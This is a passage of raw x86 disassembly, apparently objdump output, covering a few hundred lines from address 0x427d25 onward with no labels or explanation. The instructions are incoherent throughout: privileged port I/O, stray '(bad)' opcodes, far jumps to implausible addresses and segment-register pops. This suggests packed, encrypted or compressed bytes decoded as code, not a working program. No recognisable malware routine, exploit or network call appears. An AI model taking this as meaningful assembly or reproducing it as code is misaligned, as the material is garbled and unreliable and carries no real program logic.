  427d25:	mov    ebx,0xd0b9eb38
  427d2a:	out    0x72,al
  427d2c:	sti    
  427d2d:	mov    cl,cl
  427d2f:	jnp    0x427d5b
  427d31:	push   ecx
  427d32:	inc    edx
  427d33:	inc    ebx
  427d34:	lods   al,BYTE PTR ds:[esi]
  427d35:	pushf  
  427d36:	sti    
  427d37:	jle    0x427d54
  427d39:	mov    bl,BYTE PTR [edx+0x71]
  427d3c:	loopne 0x427d93
  427d3e:	inc    edx
  427d3f:	sti    
  427d40:	rcl    DWORD PTR [edi],0x6d
  427d43:	mov    DWORD PTR [ebp-0xb],edi
  427d46:	push   eax
  427d47:	leave  
  427d48:	jbe    0x427cf7
  427d4a:	jb     0x427ce4
  427d4c:	jmp    0x427d98
  427d4e:	add    BYTE PTR [edi-0x358e8f2f],al
  427d54:	sub    al,al
  427d56:	aam    0xa6
  427d58:	imul   esp,edi,0x631cfef9
  427d5e:	dec    ebx
  427d5f:	ret    0x3428
  427d62:	loop   0x427d5e
  427d64:	stc    
  427d65:	rcl    DWORD PTR [ebx+0x43],0xe9
  427d69:	icebp  
  427d6a:	xchg   esi,eax
  427d6b:	pop    ss
  427d6c:	push   ebp
  427d6d:	fbld   TBYTE PTR [ebp+eax*4-0x241c4106]
  427d74:	adc    DWORD PTR [ecx-0x304f327a],0x59
  427d7b:	cld    
  427d7c:	add    DWORD PTR [edx-0xc],esi
  427d7f:	mov    eax,0x57d95c79
  427d84:	pusha  
  427d85:	sub    al,0xc6
  427d87:	inc    ebp
  427d88:	fs and al,0x87
  427d8b:	aam    0x35
  427d8d:	lea    esp,[edi+0x13]
  427d90:	pop    ss
  427d91:	cli    
  427d92:	js     0x427d4d
  427d94:	inc    ebx
  427d95:	cmp    al,0x8e
  427d97:	nop
  427d98:	int    0x7a
  427d9a:	inc    ecx
  427d9b:	push   ebp
  427d9c:	shr    BYTE PTR [ecx+0x9],1
  427d9f:	push   eax
  427da0:	xor    BYTE PTR ds:[esi],ah
  427da3:	cmp    dh,BYTE PTR [ebp-0x38]
  427da6:	or     DWORD PTR [ebx+0x24],ebp
  427da9:	adc    edx,DWORD PTR [eax+0x11]
  427dac:	xchg   edi,eax
  427dad:	sbb    al,0xec
  427daf:	mov    esi,0xfcc580f0
  427db4:	into   
  427db5:	xor    eax,0x67063ac7
  427dba:	in     al,dx
  427dbb:	imul   ebx,DWORD PTR [esp+eiz*8+0x28],0xb2923e3f
  427dc3:	shl    BYTE PTR [esi+0xe],cl
  427dc6:	cwde   
  427dc7:	rcr    esi,cl
  427dc9:	mov    al,ds:0xbdbc9977
  427dce:	sub    BYTE PTR [ebx],ch
  427dd0:	mov    esi,0x858c112
  427dd5:	dec    esp
  427dd6:	mov    ch,0x19
  427dd8:	mov    cl,0xa
  427dda:	jle    0x427dac
  427ddc:	add    al,dh
  427dde:	mov    al,ds:0x8d14eb69
  427de3:	into   
  427de4:	mov    cl,0x62
  427de6:	mov    cl,BYTE PTR [ebx-0x5b2e83c8]
  427dec:	clc    
  427ded:	mov    bl,0x1b
  427def:	inc    eax
  427df0:	popa   
  427df1:	into   
  427df2:	mov    ecx,DWORD PTR [eax+0x797bf2d0]
  427df8:	push   edi
  427df9:	pop    ss
  427dfa:	lods   eax,DWORD PTR ds:[esi]
  427dfb:	das    
  427dfc:	mov    al,0xd3
  427dfe:	inc    edx
  427dff:	dec    edx
  427e00:	(bad)
  427e04:	dec    esp
  427e05:	or     DWORD PTR [ebx-0x31b04719],ebx
  427e0b:	push   edi
  427e0c:	xchg   edi,eax
  427e0d:	mov    esp,0x931b6f99
  427e12:	or     bh,0x8
  427e15:	mov    ecx,0x1e9371e1
  427e1a:	mov    esp,0x7ab30c42
  427e1f:	adc    ch,BYTE PTR [ebx+0x1e]
  427e22:	pop    esp
  427e23:	enter  0xacc7,0x85
  427e27:	imul   BYTE PTR [ecx]
  427e29:	dec    ecx
  427e2a:	inc    ebx
  427e2b:	xor    ch,0x1f
  427e2e:	popa   
  427e2f:	jnp    0x427e65
  427e31:	push   edi
  427e32:	mov    al,0xc5
  427e34:	out    0x8a,al
  427e36:	jno    0x427e3a
  427e38:	test   eax,0xd3bcd99c
  427e3d:	mov    ah,0x97
  427e3f:	(bad)  
  427e40:	mov    bh,0x2f
  427e42:	cmp    ah,bl
  427e44:	fimul  DWORD PTR [edi]
  427e46:	adc    esi,edi
  427e48:	and    edi,DWORD PTR [ecx-0x69]
  427e4b:	sbb    al,BYTE PTR [esi+0x72]
  427e4e:	std    
  427e4f:	jle    0x427e82
  427e51:	out    dx,eax
  427e52:	into   
  427e53:	mov    ecx,0x4a7e0566
  427e58:	repnz ror BYTE PTR [ebx],0xe0
  427e5c:	cmp    al,0x2
  427e5e:	ss xchg ecx,eax
  427e60:	nop
  427e61:	and    cl,bh
  427e63:	test   al,0x91
  427e65:	sub    DWORD PTR [ebp+0x11448013],eax
  427e6b:	mov    eax,0x8bb36d39
  427e70:	jnp    0x427e36
  427e72:	mov    bl,0x81
  427e74:	adc    edi,0x45
  427e77:	aaa    
  427e78:	mov    al,0x9f
  427e7a:	cmp    BYTE PTR [ecx+eiz*8+0x56],dh
  427e7e:	or     BYTE PTR [edx-0x40062056],dl
  427e84:	lahf   
  427e85:	(bad)
  427e88:	pop    eax
  427e89:	leave  
  427e8a:	dec    ebx
  427e8b:	adc    esp,eax
  427e8d:	(bad)  
  427e8e:	(bad)  
  427e8f:	pop    edi
  427e90:	pop    ebp
  427e91:	lea    edi,[esp+eax*8]
  427e94:	sub    BYTE PTR [esi-0xc],dl
  427e97:	sbb    BYTE PTR [ebp-0x3a23eace],0x46
  427e9e:	mov    DWORD PTR [ebp+0x2c],0x20361ad6
  427ea5:	fimul  DWORD PTR [ebx+0x69]
  427ea8:	call   0x7897:0xea008456
  427eaf:	gs into 
  427eb1:	sub    DWORD PTR [ebx+0x48],eax
  427eb4:	scas   eax,DWORD PTR es:[edi]
  427eb5:	jmp    0xfd8d5be3
  427eba:	dec    ebp
  427ebb:	stos   DWORD PTR es:[edi],eax
  427ebc:	dec    ecx
  427ebd:	xor    al,0xa0
  427ec0:	test   BYTE PTR [ebx+0x1b],0xe1
  427ec4:	(bad)  
  427ec5:	jbe    0x427eea
  427ec7:	outs   dx,BYTE PTR cs:[esi]
  427ec9:	sar    dh,0x43
  427ecc:	popf   
  427ecd:	dec    ebx
  427ece:	test   eax,0xbbc89c42
  427ed3:	pop    ebx
  427ed4:	adc    BYTE PTR [ecx-0x15],dh
  427ed7:	mov    edi,0x9fe65043
  427edc:	ret    0x3d77
  427edf:	xchg   ebp,eax
  427ee0:	or     dh,dl
  427ee2:	rcr    DWORD PTR [ebp+0x49],cl
  427ee5:	jmp    0x427e9b
  427ee7:	mov    ds:0xe231feda,al
  427eec:	retf   0x233c
  427eef:	test   ah,dh
  427ef1:	push   ecx
  427ef2:	xchg   ebp,eax
  427ef3:	lods   al,BYTE PTR ds:[esi]
  427ef4:	mov    eax,0xb6158268
  427ef9:	inc    ecx
  427efa:	(bad)  
  427efb:	xchg   ebp,eax
  427efc:	mov    al,ds:0x528eef61
  427f01:	pop    edi
  427f02:	arpl   WORD PTR ds:[ebx-0x7d42f8c3],si
  427f09:	fild   DWORD PTR [ecx+0x678a56c0]
  427f0f:	adc    ch,BYTE PTR [ebp+0x56]
  427f12:	daa    
  427f13:	xor    esi,DWORD PTR [esi-0x1ef824d1]
  427f19:	sbb    DWORD PTR [ebx+0x52595288],esp
  427f1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427f20:	shl    BYTE PTR [eax-0x14],1
  427f23:	fs adc eax,0x32899cad
  427f29:	mov    bl,0x6f
  427f2b:	jns    0x427ee4
  427f2d:	ficomp DWORD PTR [edx]
  427f2f:	and    DWORD PTR [ecx-0x24c65f45],edx
  427f35:	sub    bh,0x84
  427f38:	sbb    DWORD PTR [esi],ebx
  427f3a:	test   al,0xa4
  427f3c:	jmp    esp
  427f3e:	cmp    BYTE PTR [eax*4+0x1168fb44],al
  427f45:	sbb    eax,0x82bae27b
  427f4a:	fld    QWORD PTR [edi+esi*1]
  427f4d:	popa   
  427f4e:	pop    ss
  427f4f:	jae    0x427f6f
  427f51:	jecxz  0x427f8f
  427f53:	or     al,0xed
	...
  427f61:	mov    ah,0x8b
  427f63:	(bad)
  427f66:	fbstp  TBYTE PTR [esi-0x1e57cf15]
  427f6c:	mov    ebx,0xfcad304d
  427f71:	or     ebp,esi
  427f73:	add    DWORD PTR [eax],eax
  427f75:	xchg   esi,eax
  427f76:	add    eax,DWORD PTR [eax]
  427f78:	add    dl,bl
  427f7a:	jnp    0x427f0e
  427f7c:	sub    al,0xea
  427f7e:	mov    ebx,0x72c62345
  427f83:	mov    dh,0x31
  427f85:	adc    al,0x8b
  427f87:	and    eax,DWORD PTR [ebp+0x51]
  427f8a:	dec    esp
  427f8b:	and    eax,0x1ead9a67
  427f90:	repz adc BYTE PTR [edi+eax*1-0x5],bl
  427f95:	scas   al,BYTE PTR es:[edi]
  427f96:	add    ebp,DWORD PTR [edi]
  427f98:	push   ecx
  427f99:	int    0x7b
  427f9b:	add    DWORD PTR [ecx+0x13b53dc],0x1d8b94e3
  427fa5:	adc    DWORD PTR [edi-0x634fc7ed],esi
  427fab:	dec    ebp
  427fac:	pop    esi
  427fad:	jb     0x427fed
  427faf:	pop    eax
  427fb0:	and    al,BYTE PTR [ebp-0xaf4224d]
  427fb6:	jns    0x427f9b
  427fb8:	je     0x428038
  427fba:	mul    esp
  427fbc:	pop    es
  427fbd:	xchg   ebp,eax
  427fbe:	pop    edi
  427fbf:	and    eax,0x622fa4a7
  427fc4:	sbb    BYTE PTR [ebx+0x4c],dl
  427fc7:	xchg   ecx,eax
  427fc8:	jmp    0x89a7:0xe079ed85
  427fcf:	std    
  427fd0:	jne    0x427f8a
  427fd2:	ds jecxz 0x427fe0
  427fd5:	pop    ebx
  427fd6:	jno    0x428014
  427fd8:	repnz push ds
  427fda:	fadd   QWORD PTR [edi+edx*8+0xf]
  427fde:	(bad)  
  427fdf:	test   eax,0xa0b749f6
  427fe4:	cmovno esi,DWORD PTR [edx+0x39b41923]
  427feb:	jle    0x428003
  427fed:	lea    ebp,[ebp-0x6b]
  427ff0:	dec    edi
  427ff1:	dec    eax
  427ff2:	mov    bh,0x36
  427ff4:	and    al,bl
  427ff6:	cmp    DWORD PTR [ebp-0x6b21a7b6],eax
  427ffc:	stos   DWORD PTR es:[edi],eax
  427ffd:	ds call 0xfa11894f
  428003:	mov    BYTE PTR [ebp-0x41360a1d],dl
  428009:	out    0x8,eax
  42800b:	and    DWORD PTR [ebp+0x40752ad1],ecx
  428011:	es out dx,eax
  428013:	dec    eax
  428014:	xor    eax,0x910f6ec9
  428019:	js     0x427fa0
  42801b:	cmp    eax,0x17c59d07
  428020:	push   ds
  428021:	pushf  
  428022:	cmp    ecx,esp
  428024:	mov    cl,0xe2
  428026:	or     eax,0x6876eaf4
  42802b:	push   eax
  42802c:	xor    DWORD PTR [ebp-0x55],edi
  42802f:	mov    edi,0xb7f9bef6
  428034:	rcr    ebx,cl
  428036:	into   
  428037:	cmp    eax,0x11440a4
  42803c:	fdiv   DWORD PTR [edi+0x67672142]
  428042:	rol    DWORD PTR [ebx-0x43],1
  428045:	mov    al,ds:0x9caa647b
  42804a:	jmp    0x428027
  42804c:	fdivp  st(6),st
  42804e:	shr    ecx,1
  428050:	sahf   
  428051:	loopne 0x427ff0
  428053:	repz pop ss
  428055:	dec    eax
  428056:	mov    ch,0x68
  428058:	pushf  
  428059:	push   0xffffffdd
  42805b:	xchg   esi,eax
  42805c:	inc    ebx
  42805d:	fcmovnu st,st(1)
  42805f:	and    BYTE PTR [edx-0x6f9e263f],bl
  428065:	js     0x4280a4
  428067:	mov    eax,0x137468c9
  42806c:	push   cs
  42806d:	les    ebp,FWORD PTR [edi+ecx*4-0x19437a8d]
  428074:	xchg   ebx,eax
  428075:	scas   al,BYTE PTR es:[edi]
  428076:	jge    0x42809c
  428078:	xchg   esp,eax
  428079:	mov    bl,BYTE PTR ds:0x96519c98
  42807f:	aam    0xfb
  428081:	clc    
  428082:	shl    BYTE PTR ds:0x6afbcc66,0x51
  428089:	cmp    edx,DWORD PTR [esi+esi*8-0x62de6bb5]
  428090:	and    dl,BYTE PTR [edx-0x45]
  428093:	jmp    0xbcb6f386
  428098:	sete   BYTE PTR [eax+ebp*4-0x39]
  42809d:	push   edx
  42809e:	add    edi,DWORD PTR [edx+ebp*8-0x29821814]
  4280a5:	int3   
  4280a6:	push   edx
  4280a7:	inc    edi
  4280a8:	dec    eax
  4280a9:	xchg   ecx,eax
  4280aa:	push   ecx
  4280ab:	or     edi,DWORD PTR [ebx-0x60]
  4280ae:	xchg   BYTE PTR [edi+0x57c9cac6],ch
  4280b4:	nop    DWORD PTR [edx+0x0]
  4280b8:	(bad)  
  4280b9:	daa    
  4280ba:	rcl    BYTE PTR ds:0x7418153a,1
  4280c0:	add    ah,BYTE PTR [edi]
  4280c2:	dec    ebx
  4280c3:	(bad)  
  4280c4:	retf   
  4280c5:	loopne 0x428127
  4280c7:	fwait
  4280c8:	inc    edx
  4280c9:	in     eax,0x69
  4280cb:	ficomp WORD PTR [esi+0x2adbbfae]
  4280d1:	stc    
  4280d2:	pop    esp
  4280d3:	mov    dl,0xb2
  4280d5:	scas   eax,DWORD PTR es:[edi]
  4280d6:	and    eax,0x44c86a28
  4280db:	inc    si
  4280dd:	mov    ?,WORD PTR ds:0x12b330b1
  4280e3:	pop    ecx
  4280e4:	xor    cl,BYTE PTR [eax+0x73182865]
  4280ea:	pushf  
  4280eb:	repz xor DWORD PTR [edx],esi
  4280ee:	add    ebp,DWORD PTR [ebx]
  4280f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4280f1:	ffreep st(1)
  4280f3:	mov    esi,0xb57a2d38
  4280f8:	shl    DWORD PTR [esi+0x1d],1
  4280fb:	xchg   BYTE PTR [eax],dl
  4280fd:	cdq    
  4280fe:	mov    esp,0x6bce2636
  428103:	sahf   
  428104:	out    dx,al
  428105:	xchg   ebp,eax
  428106:	push   ebp
  428107:	pop    esp
  428108:	dec    eax
  428109:	repz mov eax,0x79c0100
  42810f:	push   0x8
  428111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428112:	retf   
  428113:	out    0xbe,al
  428115:	sbb    ebx,DWORD PTR [edi]
  428117:	jle    0x428146
  428119:	rcr    edx,0x52
  42811c:	or     dl,ch
  42811e:	stc    
  42811f:	fcmovnb st,st(6)
  428121:	cdq    
  428122:	mov    DWORD PTR [ebx+0x77],0x5f8f4634
  428129:	cs ret 0xcd6d
  42812d:	or     al,0x77
  42812f:	dec    edi
  428130:	cwde   
  428131:	mov    ebx,0xe01ed582
  428136:	(bad)  [eax+0x2a]
  428139:	jmp    0x3173:0xf5ee3d13
  428140:	imul   ebx,ebp,0xd
  428143:	push   esi
  428144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428145:	fst    DWORD PTR [edi+0x5869e715]
  42814b:	sub    al,0x21
  42814d:	xor    BYTE PTR [eax],ah
  42814f:	(bad)  
  428150:	jne    0x428106
  428152:	lea    eax,[ebp+0x40]
  428155:	or     DWORD PTR [edx-0x2c],esi
  428158:	pop    edx
  428159:	fistp  WORD PTR [ebx-0x71]
  42815c:	jp     0x4280f0
  42815e:	jecxz  0x428182
  428160:	mov    eax,0xef18b22b
  428165:	xor    al,0x90
  428167:	xor    BYTE PTR [edi+0x7c],0xae
  42816b:	repnz nop
  42816d:	or     DWORD PTR [edi-0x5c06f16d],ebx
  428173:	push   0x1a287e94
  428178:	lahf   
  428179:	adc    ebp,ebp
  42817b:	jecxz  0x428124
  42817d:	sti    
  42817e:	mov    ds:0x306f315,eax
  428183:	pop    ds
  428184:	xchg   edx,eax
  428185:	xlat   BYTE PTR ds:[ebx]
  428186:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428187:	repz (bad) 
  428189:	repnz xor DWORD PTR [edi],esp
  42818c:	icebp  
  42818d:	inc    ebp
  42818e:	cmp    DWORD PTR [edx],0xffffffb6
  428191:	jne    0x42820d
  428193:	outs   dx,BYTE PTR ds:[esi]
  428194:	(bad)
  428197:	sbb    al,0xb2
  428199:	pusha  
  42819a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42819b:	adc    cl,BYTE PTR [ebp*4-0x34202728]
  4281a2:	stc    
  4281a3:	xchg   edi,eax
  4281a4:	xchg   esi,eax
  4281a5:	mov    ss,WORD PTR [edx-0x74]
  4281a8:	shl    DWORD PTR [edi],0xb
  4281ab:	js     0x428158
  4281ad:	(bad)  
  4281ae:	xor    al,0xf7
  4281b0:	push   ss
  4281b1:	pop    esi
  4281b2:	fprem1 
  4281b4:	data16 or al,0x70
  4281b7:	and    ebx,DWORD PTR [edx+0x7ee123e7]
  4281bd:	sbb    edi,DWORD PTR [edx+0x3f]
  4281c0:	xchg   ebp,eax
  4281c1:	sbb    dl,BYTE PTR [esi]
  4281c3:	cmp    edi,ebp
  4281c5:	push   ds
  4281c6:	cmp    BYTE PTR [esi-0x25],dh
  4281c9:	xchg   edx,eax
  4281ca:	test   al,0xab
  4281cc:	sbb    al,0xed
  4281ce:	push   0x65
  4281d0:	scas   al,BYTE PTR es:[edi]
  4281d1:	sub    BYTE PTR [esi-0x4e],cl
  4281d4:	mov    ebp,0xb3734aed
  4281d9:	jecxz  0x42821c
  4281db:	lock stos BYTE PTR es:[di],al
  4281de:	mov    bl,0x77
  4281e0:	xchg   ebp,eax
  4281e1:	and    ebx,DWORD PTR [esi]
  4281e3:	add    BYTE PTR [ebp+0x78566fe3],dl
  4281e9:	push   edx
  4281ea:	les    esp,FWORD PTR [ebx+0x37fc0245]
  4281f0:	mov    ds:0x68fe6bfe,al
  4281f5:	jae    0x428194
  4281f7:	pop    ebx
  4281f9:	hlt    
  4281fa:	and    al,0x98
  4281fc:	retf   0xd8fa
  4281ff:	inc    ebx
  428200:	adc    al,0x96
  428202:	mov    edx,0xfc32694c
  428207:	sub    edx,DWORD PTR [edx-0x17]
  42820a:	dec    ebp
  42820b:	imul   ebp,DWORD PTR [ecx-0x6c],0x834bc871
  428212:	mov    al,ds:0xcae7c932
  428217:	daa    
  428218:	sub    al,0x64
  42821a:	pop    ss
  42821b:	adc    ch,bl
  42821d:	aaa    
  42821e:	out    dx,eax
  42821f:	and    ecx,eax
  428221:	push   0xc86d52f
  428226:	push   cs
  428227:	lods   eax,DWORD PTR ds:[esi]
  428228:	arpl   WORD PTR [esp+esi*2],sp
  42822b:	push   cs
  42822c:	je     0x4281bb
  42822e:	cmc    
  42822f:	and    ebp,esp
  428231:	push   edi
  428232:	into   
  428233:	xchg   ebx,eax
  428234:	mov    edi,esi
  428236:	sahf   
  428237:	dec    esi
  428238:	add    cl,ah
  42823a:	sub    DWORD PTR ds:0xccf5f815,ebp
  428240:	stos   DWORD PTR es:[edi],eax
  428241:	push   ebx
  428242:	add    bl,BYTE PTR [eax+0x5ff3bf53]
  428248:	scas   eax,DWORD PTR es:[edi]
  428249:	sub    al,0xa9
  42824b:	lods   eax,DWORD PTR ds:[esi]
  42824c:	not    ch
  42824e:	add    al,0xc0
  428250:	sar    BYTE PTR [ebx-0x1252e85b],0xd3
  428257:	jmp    0xe2ccf0de
  42825c:	inc    eax
  42825d:	pop    edi
  42825e:	loop   0x428227
  428260:	push   0xef701468
  428265:	inc    eax
  428266:	mov    bl,0xf4
  428268:	repz xor dl,BYTE PTR [edx]
  42826b:	sbb    BYTE PTR [ebx-0x7],bh
  42826e:	push   0x5c
  428270:	stos   BYTE PTR es:[edi],al
  428271:	lods   al,BYTE PTR ds:[esi]
  428272:	out    dx,eax
  428273:	test   DWORD PTR [edi],0x3908dd8b
  428279:	push   edx
  42827a:	rcl    DWORD PTR [edi+0xa],0xa
  42827e:	cdq    
  42827f:	sbb    al,0x9b
  428281:	lods   al,BYTE PTR ds:[esi]
  428282:	cmc    
  428283:	adc    eax,0x86000667
  428288:	loop   0x428248
  42828a:	in     eax,0x3d
  42828c:	and    DWORD PTR [ebx],edx
  42828e:	(bad)  
  42828f:	jae    0x4282ab
  428291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428292:	or     eax,0x6e100be
  428297:	iret   
  428298:	mov    al,0x4c
  42829a:	jle    0x428317
  42829c:	dec    esp
  42829d:	test   BYTE PTR [ecx+0x4e5e9cd8],0xe6
  4282a4:	dec    esi
  4282a5:	pop    edx
  4282a6:	rcr    dl,1
  4282a8:	cwde   
  4282a9:	push   ss
  4282aa:	jecxz  0x428269
  4282ac:	bound  ecx,QWORD PTR [ecx-0x5f]
  4282af:	mov    al,ds:0xb3ec5f50
  4282b4:	push   esp
  4282b5:	sti    
  4282b6:	bound  eax,QWORD PTR [eax+0x11]
  4282b9:	fwait
  4282ba:	jo     0x428305
  4282bc:	lds    eax,FWORD PTR [eax-0xd]
  4282bf:	pop    ebx
  4282c0:	jmp    0x428323
  4282c2:	mov    edx,0xa9f171e0
  4282c7:	xchg   esi,eax
  4282c8:	sub    ebp,ecx
  4282ca:	xchg   esp,eax
  4282cb:	and    al,BYTE PTR [esi+0x48]
  4282ce:	mov    bl,0x6f
  4282d0:	fidiv  WORD PTR [edi-0x4c084796]
  4282d6:	cld    
  4282d7:	pusha  
  4282d8:	test   BYTE PTR [ebx-0x3e2d896a],cl
  4282de:	lods   al,BYTE PTR ds:[esi]
  4282df:	inc    ebp
  4282e0:	ret    
  4282e1:	xchg   eax,ecx
  4282e3:	not    BYTE PTR [ebp+0x66a06d6]
  4282e9:	push   0x17
  4282eb:	push   esi
  4282ec:	imul   ebp,eax,0x77d73a9d
  4282f2:	(bad)  
  4282f3:	(bad)  [ebx]
  4282f5:	mov    BYTE PTR [ecx-0x4b37b9be],dh
  4282fb:	adc    al,0x2c
  4282fd:	dec    edx
  4282fe:	adc    ah,bh
  428300:	sub    ecx,ecx
  428302:	inc    ebx
  428303:	cmp    eax,0xeaf7a822
  428308:	mov    edx,gs
  42830a:	mov    ah,0x96
  42830c:	xchg   esi,eax
  42830d:	jp     0x42832e
	...
